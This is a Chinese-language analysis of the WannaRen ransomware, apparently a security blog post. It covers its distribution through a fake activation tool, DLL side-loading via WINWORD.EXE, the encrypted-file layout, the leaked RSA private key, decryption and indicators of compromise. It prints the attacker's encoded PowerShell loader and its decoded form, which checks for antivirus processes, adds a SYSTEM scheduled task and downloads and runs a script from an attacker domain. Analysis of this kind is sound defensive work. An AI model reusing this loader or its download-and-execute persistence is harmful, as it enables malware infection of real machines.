## **样本简介**

WannaRen勒索软件是最近很热点的事件，热点主要来源于以下三点，杀软当时没有检测到该恶意文件；其次是用户的文件被加密了从而发起网上求救；最后一点是采用了VMP壳，让安全人员最初进行分析的大部分工作变成了对壳的对抗。

如下是“沸沸扬扬”的解密器（笔者刚开始也以为是加密器），加了VMP壳，本文将以一种分析过程探索的方式进行详细记录并填坑。如下同样是会检测虚拟机，载入后会被反调试，提示文字存在繁体与简体混合的情况，样本来源于网友共享。

![image.png](https://image.3001.net/images/20200414/1586832790_5e95259697ee9.png!small)![image.png](https://image.3001.net/images/20200414/1586832794_5e95259a0c0a0.png!small)![image.png](https://image.3001.net/images/20200414/1586832797_5e95259dcf55b.png!small)  

加密后的文件名如下，提供的比特币地址为“1NXTgfGprVktuokv3ZLhGCPCjcKjXbswAM”，联系邮箱为“WannaRenemal@goat.si”。  

![image.png](https://image.3001.net/images/20200414/1586832806_5e9525a636a16.png!small)  

##  **样本分析**

在追踪溯源这方面，最终定位了传播本次恶意程序的渠道站点有如下，除了激活工具，还有该站点下载的notepad++程序也存在问题。

![image.png](https://image.3001.net/images/20200414/1586832816_5e9525b02046a.png!small)![image.png](https://image.3001.net/images/20200414/1586832819_5e9525b38b7cd.png!small)![image.png](https://image.3001.net/images/20200414/1586832822_5e9525b6c137f.png!small)  

先下载高速下载器，然后高速下载器才会下载有存在问题的恶意程序至用户本地，如下。  

![image.png](https://image.3001.net/images/20200414/1586832830_5e9525be8f1a3.png!small)![image.png](https://image.3001.net/images/20200414/1586832834_5e9525c21db7b.png!small)![image.png](https://image.3001.net/images/20200414/1586832836_5e9525c4d80e8.png!small)  

这个所谓的激活工具直接在程序里硬编码了powershell的相关命令，如下。  

![image.png](https://image.3001.net/images/20200414/1586832849_5e9525d184e08.png!small)  

手工提取出来的最初内容如下

`powershell.exe -NoP -NonI -W Hidden -ep Bypass -enc
UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMgAwADAAMAANAAoAJABpAGQAIAAgAD0AIABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAG4AYQBtAGUAIAAzADYAMAB0AHIAYQB5ACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABpAGQAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAALQBQAHIAbwBjAGUAcwBzAHsAJABfA**AaQBkAH0ADQAKACQAaQBkAA0ACgBpAGYAKAAkAGkAZAAgAC0AbABlACAAMAApAHsADQAKACAAIAAkAGkAZAAgACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0AbgBhAG0AZQAgAFEAUQBQAEMAVAByAGEAeQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAaQBkACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAC0AUAByAG8AYwBlAHMAcwB7ACQAXwAuAGkAZAB9AA0ACgAkAGkAZAANAAoAaQBmACgAJABpAGQAIAAtAGwAZQAgADAAKQB7AA0ACgANAAoAcwBjAGgAdABhAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AcgB1ACAAcwB5AHMAdABlAG0AIAAvAHMAYwAgAE0ASQBOAFUAVABFACAALwBtAG8AIAAyADgAIAAvAHQAbgAgAGMAcwBhAHAAdQAgAC8AdAByACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsA**AZQB4AGUAIAAtAGUAcAAgAGIAeQBwAGEAcwBzACAALQBlACAAUwBRAEIARgBBAEYAZwBBAEkAQQBBAG8AQQBDAGcAQQBiAGcAQgBsAEEASABjAEEATABRAEIAdgBBAEcASQBBAGEAZwBCAGwAQQBHAE0AQQBkAEEAQQBnAEEARwA0AEEAWgBRAEIAMABBAEMANABBAGQAdwBCAGwAQQBHAEkAQQBZAHcAQgBzAEEARwBrAEEAWgBRAEIAdQBBAEgAUQBBAEsAUQBBAHUAQQBHAFEAQQBiAHcAQgAzAEEARwA0AEEAYgBBAEIAdgBBAEcARQBBAFoAQQBCAHoAQQBIAFEAQQBjAGcAQgBwAEEARwA0AEEAWgB3AEEAbwBBAEMAYwBBAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEIAagBBAEgATQBBAEwAZwBCAHoAQQBIAE0AQQBiAEEAQgB6AEEARwA0AEEAWgB3AEIANQBBAEcAdwBBAE8AUQBBAHcAQQBDADQAQQBZAHcAQgB2AEEARwAwAEEASgB3AEEAcABBAEMAawBBACIAIAANAAoADQAKACAAIAAgACAAfQANAAoADQAKAA0ACgAgACAAIAAgAH0ADQAKAAAA`

解码得到，如下。

![image.png](https://image.3001.net/images/20200414/1586832949_5e9526356a3d8.png!small)  

``

`Start-Sleep -Seconds 2000`

``

`$id = Get-Process -name 360tray | Select-Object id | ForEach-Object
-Process{$_.id}`

``

`$id`

``

`if($id -le 0){`

``

` $id = Get-Process -name QQPCTray | Select-Object id | ForEach-Object
-Process{$_.id}`

``

`$id`

``

`if($id -le 0){`

``

`schtasks /create /ru system /sc MINUTE /mo 28 /tn csapu /tr "powershell.exe
-ep bypass -e
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0A**AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBjAHMALgBzAHMAbABzAG4AZwB5AGwAOQAwA**AYwBvAG0AJwApACkA"`

``

` }`

``

` }`

``

  

执行后会先延时2000秒（大概33分钟），检测是否存在相关安全防护进程，针对性很强，可以看出是针对国内普通的个人用户环境。

最后还是会执行一段powershell脚本

`powershell.exe -ep bypass -e
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0A**AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBjAHMALgBzAHMAbABzAG4AZwB5AGwAOQAwA**AYwBvAG0AJwApACkA`

解码得到

`IEX ((new-object net.webclient).downloadstring('http://cs.sslsngyl90.com'))`

这里会通过站点返回的内容作为命令执行，但是目前由于作者一开始就很警觉，导致站点已无法访问，已经没法得到相关的后续脚本了。

## **环境准备**

先下载恶意的dll文件wwlib.dll，文件名为WINWORD.EXE的程序是正常程序，是office2007中的word主程序，带有微软的数字签名（从安装的office2007中进行提取即可）。恶意软件采用白加黑的模式，通过WINWORD.EXE执行同目录下的恶意wwlib.dll，将WINWORD安装为服务，如果就这样本地直接重启后，肯定是没法出现任何恶意行为的，因为执行会失败。

![image.png](https://image.3001.net/images/20200414/1586833005_5e95266d4f34f.png!small)![image.png](https://image.3001.net/images/20200414/1586833008_5e9526702b719.png!small)  

之后尝试手工启动该服务，也是失败。命令如下：net start 服务名 sc start 服务名

由于服务启动失败，同时也无任何加密的行为。最初猜测可能是dll文件导致的原因，最终测试后发现本地环境还缺失you这个文件，拿到you文件后放置到C:\Users\Public路径下，运行WINWORD.exe后会自动生成fm文件，内容实质为该服务创建的时间。

![image.png](https://image.3001.net/images/20200414/1586833019_5e95267b754e1.png!small)![image.png](https://image.3001.net/images/20200414/1586833022_5e95267e2b590.png!small)![image.png](https://image.3001.net/images/20200414/1586833024_5e952680e5471.png!small)  

至此，服务安装完成。以为所需的文件都弄好后正常情况下等待重启后会进一步执行加密，但是实际本地测试个人环境依然无法加密，笔者困扰了一会。

之后针对服务启动失败的问题进行了一些尝试，但是仍然无法获取到后续的恶意行为。最后突然想起由于dll是VMP加壳的，按照这个作者的一贯想法，对于解密器也都加VMP，估计dll如果加壳了，那么检测虚拟机的选项也应该选过了，所以服务启动执行时会不会检测到虚拟机环境呢？猜测这里很有概率是导致失败的原因（这里思路是对的，启动不成功，肯定有检测了什么东西，但是实际并不是检测虚拟机环境，最终为了延时启动而检查了fm文件的时间）。

最终才知道失败的原因是没有修改fm文件的时间，这里的话，恶意软件安装为服务后，如果一旦启动就会对当前fm内的安装时间进行检查，确保是当前系统时间是安装服务之后几天后才能执行恶意软件，从而开启加密行为，估计是为了迷惑用户的行为。

加密成功后会出现的三个勒索信文件，如下。

![image.png](https://image.3001.net/images/20200414/1586833037_5e95268daaa8a.png!small)勒索信内容，如下。  

![image.png](https://image.3001.net/images/20200414/1586833045_5e952695e85f6.png!small)  

  

加密完成后会删除fm文件，如下。  

![image.png](https://image.3001.net/images/20200414/1586833091_5e9526c357e75.png!small)  

样本会自删除，如下。  

![image.png](https://image.3001.net/images/20200414/1586833098_5e9526ca83614.png!small)  

同样此时的WINWORD服务也已经没有了，采用的加密算法加密速度也特别快，测试环境大概5-6分钟即可完成加密。从刚刚的结果发现自删除后，系统里没有相关样本了，实质是WINWORD.EXE复制到了Temp目录下，wwlib.dll也复制到了该目录下并改名。  

![image.png](https://image.3001.net/images/20200414/1586833106_5e9526d235568.png!small)

![image.png](https://image.3001.net/images/20200414/1586833109_5e9526d5db19b.png!small)![image.png](https://image.3001.net/images/20200414/1586833113_5e9526d969717.png!small)  

之后读取you文件进行内存解密，执行后会注入到cmd.exe中执行勒索核心代码，虽然发现疑似有对svchost.exe（SysWOW64目录下32位程序）进行了注入，但是后续没有成功启动。  

![image.png](https://image.3001.net/images/20200414/1586833121_5e9526e12e655.png!small)  

最终通过获取进程内存，得到的一些信息可以查看到公钥与加密的后缀名。

\-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxTC/Igjuybr1QbQ1RmD9

YxpzVnJKIkgvYpBrBzhsczHQ8WeC7ikmC5jTbum1eCxTFTxvtnONEy2qDbnSS5fb

K/lxYExj6aDLKzQxXCOVSdSQCesWg1i5AAdUC9S246sdS9VKxT0QL24I+SG+ixck

BhcB+ww6z47ACegoH0aLDwvRvehZYcc1qFr1lhRXQpHunrlg4WRphH5xBbszOI+d

FRDOpprnbN56CHoLb0q1SzzV3ZFAFF6Df68Pux1wMHwEXbULRHo5AIZJPJq8L9Th

WVsj6v42jAjJQ8m8bRh0+Jz4RohkWwPgL+VFxDG2AiiCU5/yLNoQX0JM9VWBxy6Z

3QIDAQAB

\-----END PUBLIC KEY-----
附解密密钥

\-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxTC/Igjuybr1QbQ1RmD9YxpzVnJKIkgvYpBrBzhsczHQ8WeC

7ikmC5jTbum1eCxTFTxvtnONEy2qDbnSS5fbK/lxYExj6aDLKzQxXCOVSdSQCesW

g1i5AAdUC9S246sdS9VKxT0QL24I+SG+ixckBhcB+ww6z47ACegoH0aLDwvRvehZ

Ycc1qFr1lhRXQpHunrlg4WRphH5xBbszOI+dFRDOpprnbN56CHoLb0q1SzzV3ZFA

FF6Df68Pux1wMHwEXbULRHo5AIZJPJq8L9ThWVsj6v42jAjJQ8m8bRh0+Jz4Rohk

WwPgL+VFxDG2AiiCU5/yLNoQX0JM9VWBxy6Z3QIDAQABAoIBADi/KoH06CMNtn7O

CXbTepgGiKKcCVGMTHak8OgHCM6ty19tVnSLSvOTa2VDxIFs4AwAdHWhEzwtq/5/

N1GhxeUFx+balPYq28z3HC1T4CZ7EWiJStVJtxOXCEzPTkJ+f9PO8dGJHRtJIzPu

zhLg+fD2tg81GceZYRJ4yPMXLfWKA5DmGkRv/1Usq5zvMClLdrmw/q2rnCbRLdeE

EAzSAi9kqsnEaZKfCbXb/gby+bUwAgn7mxs+CJ611hzD/r2w9dgXkaUJYuKRRv+B

GlQHBRQ7hXogkIzeaGqmw8M3xko7xzADsytFYxt2Kthuww2YV4E6Q1Hl4bBW0q+g

w+jSolECgYEA0Tnns+LaqMd5KCQiyWlCodQ2DtOMOefhIrJbRhdAkAq6FtVICxkL

nIJL0gmo4T/zDaMr8vsn7Ck+wLjXUsYt1/EulLtVnuH76FU0PkjJqBdre5Gjf23/

YGHW7DJEoH3p/7DIgV4+wXPu6dD+8eECqwm1hLACOxkfZnOFZ1VGxeMCgYEA8UYH

jaA69ILlz0TzDzoRdTmam6RDqjsVO/bwaSChGphV0dicKue25iUUDj87a1yLU5Nq

t0Kt0w1FL/iile1Eu4fe4ryukPGw2jAZh/xq7i2RRSFLXim5an9AbBVQ55478AJa

sTaIOSoODgBspsBLShnXQRKEfwYPv2GthhcJLT8CgYAssRDERQ3uBYXkxCtGGJzq

Enllm1yVtelKTwzeIPNikVgErpRQAo6PZOmrOPMBAnb5j8RAh9OUR48m/ZTJEpoS

SWtoy8dTQ/RaQXECaOviYvZLk+V3v9hQDzYoh+hO2/aS7oE12RrQmeILwd/jbOvz

+wPyDuK7GvexG7YAR5/xfwKBgQCA8p6C0MnxeCv+dKk60BwYfKrm2AnZ5y3YGIgw

h2HS5uu**Y+xVpnnspVfb+f/3zwPdNAqFZb1HziFBOtQGbkMSPeUUqcxjBqq4d4j

UYKMvQnQ2pR/ROl1w4DYwyO0RlteUMPLxotTkehlD1ECZe9XMSxb+NubT9AGxtuI

uLMM3QKBgGl0mYCgCVHi4kJeBIgabGqbS2PuRr1uogAI7O2b/HQh5NAIaNEqJfUa

aTKS5WzQ6lJwhRLpA6Un38RDWHUGVnEmm8/vF50f74igTMgSddjPwpWEf3NPdu0Z

UIfJd1hd77BYLviBVYft1diwIK3ypPLzhRhsBSp7RL2L6w0/Y9rf

\-----END RSA PRIVATE KEY-----
加密后缀名列表，如下。

![image.png](https://image.3001.net/images/20200414/1586833145_5e9526f9ddb89.png!small)  

还有一些内嵌的数据，如下。  

![image.png](https://image.3001.net/images/20200414/1586833160_5e9527086e256.png!small)![image.png](https://image.3001.net/images/20200414/1586833163_5e95270b5a075.png!small)![image.png](https://image.3001.net/images/20200414/1586833165_5e95270df3837.png!small)  

##  **关于解密**

随着事件的发酵，导致作者竟然主动提供了RSA私钥，所以接下来可以分析看看如何对文件进行解密。

![image.png](https://image.3001.net/images/20200414/1586833175_5e952717ae51d.png!small)  

通过分析可知，此次勒索采用了R**+RSA混合加密的方案，采用时间种子产生随机R**密钥（14个字节，由于本次加密与解密器都在用户本地，需要输入key，所以该14个字节肯定是ascii码可见字符），之后采用同一个密钥加密文件。

## **加密文件的组成**

R**密钥被硬编码的RSA公钥加密，附在已加密的文件头部（WannaRenkey后的256个字节）。WannaRen1与WannaRen2之间的数据为实际已被加密的文件数据。由于详细给出了被加密文件的组合部分，依据得到的信息，如果有黑客的RSA私钥（已主动提供），编写解密工具不是很难。

![image.png](https://image.3001.net/images/20200414/1586833187_5e952723d4f06.png!small)

![image.png](https://image.3001.net/images/20200414/1586833193_5e9527299ac15.png!small)  

##  **解密演示**

拿到本地解密器所需的密码后，执行解密器可直接解密全部已被加密的文件。

![image.png](https://image.3001.net/images/20200414/1586833210_5e95273a5bcb8.png!small)![image.png](https://image.3001.net/images/20200414/1586833213_5e95273dd12aa.png!small)![image.png](https://image.3001.net/images/20200414/1586833216_5e952740a817f.png!small)  

解密过程采用了微软提供的CSP，至此分析结束。

## **威胁情报**

HASH

CEAA5817A65E914AA178B28F12359A46

9854723BF668C0303A966F2C282F72EA

2D84337218E87A7E99245BD8B53D6EAB

URL

cs.sslsngyl90.com

